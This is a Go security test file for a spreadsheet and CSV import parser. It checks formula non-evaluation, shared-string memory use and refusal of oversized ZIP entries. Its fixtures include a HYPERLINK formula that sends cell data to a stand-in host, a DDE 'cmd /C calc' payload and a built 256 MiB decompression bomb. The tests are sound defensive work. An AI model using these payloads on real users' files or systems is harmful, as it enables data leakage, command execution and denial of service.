package importer

// Security tests of the import parser, phase 2 (SEC-11, WP-829): unit
// tests without a database. They hold only cases parse_test.go (WP-301)
// does not cover; there: the unpack ratio, the row, column and row length
// limits and the ZIP signature. Cross-tenant ids of an import are WP-827's.

import (
	"archive/zip"
	"bytes"
	"compress/flate"
	"errors"
	"os"
	"runtime"
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/xuri/excelize/v2"
)

// formulaSheet is a worksheet with formula cells as a spreadsheet program
// writes them: row 2 formulas without a stored value, row 3 a DDE call
// and formulas with a stored value (<v>), row 4 text that looks like
// formulas.
const formulaSheet = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>
<row r="1"><c r="A1" t="inlineStr"><is><t>name</t></is></c><c r="B1" t="inlineStr"><is><t>link</t></is></c><c r="C1" t="inlineStr"><is><t>sum</t></is></c></row>
<row r="2"><c r="A2" t="inlineStr"><is><t>web-01</t></is></c><c r="B2"><f>HYPERLINK("https://evil.example.org/?leak="&amp;A2,"click")</f></c><c r="C2"><f>1+1</f></c></row>
<row r="3"><c r="A3" t="inlineStr"><is><t>web-02</t></is></c><c r="B3" t="str"><f>cmd|' /C calc'!A0</f><v>dde</v></c><c r="C3"><f>40+2</f><v>7</v></c></row>
<row r="4"><c r="A4" t="inlineStr"><is><t>=cmd|' /C calc'!A0</t></is></c><c r="B4" t="inlineStr"><is><t>=HYPERLINK("https://evil.example.org","x")</t></is></c><c r="C4" t="inlineStr"><is><t>@SUM(1+1)</t></is></c></row>
</sheetData></worksheet>`

// withSheet returns the workbook data with its first worksheet replaced by
// sheet.
func withSheet(t *testing.T, data []byte, sheet string) []byte {
	t.Helper()
	src, err := zip.NewReader(bytes.NewReader(data), int64(len(data)))
	if err != nil {
		t.Fatal(err)
	}
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for _, e := range src.File {
		if e.Name != "xl/worksheets/sheet1.xml" {
			if err = zw.Copy(e); err != nil {
				t.Fatal(err)
			}
			continue
		}
		w, cerr := zw.Create(e.Name)
		if cerr != nil {
			t.Fatal(cerr)
		}
		_, _ = w.Write([]byte(sheet))
	}
	if err = zw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

// TestXLSXFormulaCellsAreNotEvaluated: a formula cell is read over
// File.Rows() as its stored value (empty without one), a text cell that
// looks like a formula as its text; nothing is evaluated, no link or DDE
// call is followed.
func TestXLSXFormulaCellsAreNotEvaluated(t *testing.T) {
	data := withSheet(t, workbook(t, map[string][][]string{"S": {{"x"}}}, "S"), formulaSheet)
	r, err := OpenXLSX(bytes.NewReader(data), "")
	if err != nil {
		t.Fatalf("open: %v", err)
	}
	rows, _, err := readAll(t, r)
	_ = r.Close()
	if err != nil || len(rows) != 3 || !slices.Equal(r.Header(), []string{"name", "link", "sum"}) {
		t.Fatalf("header %v rows %+v err %v", r.Header(), rows, err)
	}
	for i, want := range [][]string{
		{"web-01", "", ""},
		{"web-02", "dde", "7"},
		{"=cmd|' /C calc'!A0", `=HYPERLINK("https://evil.example.org","x")`, "@SUM(1+1)"},
	} {
		got := rows[i].Cells
		for len(got) < len(want) {
			got = append(got, "")
		}
		if !slices.Equal(got, want) {
			t.Errorf("row %d: %q, want %q (stored value, nothing evaluated)", rows[i].Line, got, want)
		}
	}
}

// TestXLSXLargeSharedStringsStayOutOfMemory: a sharedStrings.xml above
// UnzipXMLSizeLimit is not unpacked in memory; excelize stores it in the
// temporary directory, the rows read their strings from there, and the
// temporary files are gone after Close.
func TestXLSXLargeSharedStringsStayOutOfMemory(t *testing.T) {
	tmp := t.TempDir()
	t.Setenv("TMPDIR", tmp)
	restore := xlsxUnzipXMLSizeLimit
	xlsxUnzipXMLSizeLimit = 4 << 10
	t.Cleanup(func() { xlsxUnzipXMLSizeLimit = restore })

	f := excelize.NewFile()
	const n = 400
	for i := 1; i <= n; i++ {
		cell, _ := excelize.CoordinatesToCellName(1, i)
		if err := f.SetCellStr("Sheet1", cell, "shared-string-"+strconv.Itoa(i)+"-"+strings.Repeat("x", 40)); err != nil {
			t.Fatal(err)
		}
	}
	buf, err := f.WriteToBuffer()
	_ = f.Close()
	if err != nil {
		t.Fatal(err)
	}
	zr, err := zip.NewReader(bytes.NewReader(buf.Bytes()), int64(buf.Len()))
	if err != nil {
		t.Fatal(err)
	}
	var sstSize uint64
	for _, e := range zr.File {
		if e.Name == "xl/sharedStrings.xml" {
			sstSize = e.UncompressedSize64
		}
	}
	if sstSize <= uint64(xlsxUnzipXMLSizeLimit) {
		t.Fatalf("sharedStrings.xml has %d bytes, not above the limit %d", sstSize, xlsxUnzipXMLSizeLimit)
	}

	r, err := OpenXLSX(bytes.NewReader(buf.Bytes()), "")
	if err != nil {
		t.Fatalf("open: %v", err)
	}
	x := r.(*xlsxReader)
	if content, ok := x.f.Pkg.Load("xl/sharedStrings.xml"); ok && len(content.([]byte)) > 0 {
		t.Fatalf("sharedStrings.xml unpacked in memory (%d bytes)", len(content.([]byte)))
	}
	entries, err := os.ReadDir(tmp)
	if err != nil || len(entries) == 0 {
		t.Fatalf("no temporary file in %s: %v %v", tmp, entries, err)
	}
	rows, _, err := readAll(t, r)
	if err != nil || len(rows) != n-1 || rows[n-2].Cells[0] != "shared-string-"+strconv.Itoa(n)+"-"+strings.Repeat("x", 40) {
		t.Fatalf("rows %d err %v", len(rows), err)
	}
	if content, ok := x.f.Pkg.Load("xl/sharedStrings.xml"); ok && len(content.([]byte)) > 0 {
		t.Fatalf("sharedStrings.xml loaded into memory while reading (%d bytes)", len(content.([]byte)))
	}
	if err = r.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	if entries, err = os.ReadDir(tmp); err != nil || len(entries) != 0 {
		t.Fatalf("temporary files after Close: %v %v", entries, err)
	}
}

// TestXLSXEntryLargerThanDeclaredIsRefused: a ZIP entry whose actual size
// exceeds the size in its header (a workbook of 1 KiB declared that
// inflates to 256 MiB) ends the import with a problem type of WP-301 and
// is not unpacked completely: the reader stops past the declared size.
func TestXLSXEntryLargerThanDeclaredIsRefused(t *testing.T) {
	const actual = 256 << 20
	var deflated bytes.Buffer
	fw, err := flate.NewWriter(&deflated, flate.BestCompression)
	if err != nil {
		t.Fatal(err)
	}
	chunk := make([]byte, 1<<20)
	for range actual / len(chunk) {
		if _, err = fw.Write(chunk); err != nil {
			t.Fatal(err)
		}
	}
	if err = fw.Close(); err != nil {
		t.Fatal(err)
	}

	valid := workbook(t, map[string][][]string{"S": {{"name"}, {"web-01"}}}, "S")
	src, err := zip.NewReader(bytes.NewReader(valid), int64(len(valid)))
	if err != nil {
		t.Fatal(err)
	}
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for _, e := range src.File {
		if e.Name == "xl/worksheets/sheet1.xml" {
			w, cerr := zw.CreateRaw(&zip.FileHeader{Name: e.Name, Method: zip.Deflate,
				CompressedSize64: uint64(deflated.Len()), UncompressedSize64: 1 << 10})
			if cerr != nil {
				t.Fatal(cerr)
			}
			_, _ = w.Write(deflated.Bytes())
			continue
		}
		if err = zw.Copy(e); err != nil {
			t.Fatal(err)
		}
	}
	if err = zw.Close(); err != nil {
		t.Fatal(err)
	}

	var before, after runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&before)
	r, err := OpenXLSX(bytes.NewReader(buf.Bytes()), "")
	runtime.ReadMemStats(&after)
	if err == nil {
		_ = r.Close()
		t.Fatal("a workbook with an entry larger than declared was opened")
	}
	var pe *ParseError
	if !errors.As(err, &pe) || !pe.Fatal || (pe.Code != CodeFormatUnsupported && pe.Code != CodeFileTooComplex) {
		t.Fatalf("error = %v, want a fatal %s or %s", err, CodeFormatUnsupported, CodeFileTooComplex)
	}
	if grown := after.TotalAlloc - before.TotalAlloc; grown > actual/4 {
		t.Fatalf("the parser allocated %d bytes for an entry of %d bytes: unpacked beyond the declared size", grown, actual)
	}
}

// TestCSVFormulaCellsAreTakenAsText: a CSV cell with a leading =, +, - or
// @ is taken unchanged as text; neutralizing is the export's task
// (neutralizeFormula, WP-593, F-338), not the import's.
func TestCSVFormulaCellsAreTakenAsText(t *testing.T) {
	cells := []string{`=HYPERLINK("https://evil.example.org","x")`, "+1+1", "-2+3", "@SUM(A1)", `=cmd|' /C calc'!A0`}
	var content strings.Builder
	content.WriteString("a;b;c;d;e\n")
	for i, c := range cells {
		if i > 0 {
			content.WriteByte(';')
		}
		content.WriteString(`"` + strings.ReplaceAll(c, `"`, `""`) + `"`)
	}
	content.WriteString("\n")
	r, err := OpenCSV(strings.NewReader(content.String()))
	if err != nil {
		t.Fatalf("open: %v", err)
	}
	rows, rowErrs, err := readAll(t, r)
	if err != nil || len(rowErrs) != 0 || len(rows) != 1 || !slices.Equal(rows[0].Cells, cells) {
		t.Fatalf("rows %+v row errors %v err %v, want the cells unchanged", rows, rowErrs, err)
	}

	// Unquoted, too.
	r, err = OpenCSV(strings.NewReader("a,b,c\n=1+1,+2,@x\n"))
	if err != nil {
		t.Fatal(err)
	}
	rows, _, err = readAll(t, r)
	if err != nil || len(rows) != 1 || !slices.Equal(rows[0].Cells, []string{"=1+1", "+2", "@x"}) {
		t.Fatalf("unquoted: rows %+v err %v", rows, err)
	}
}
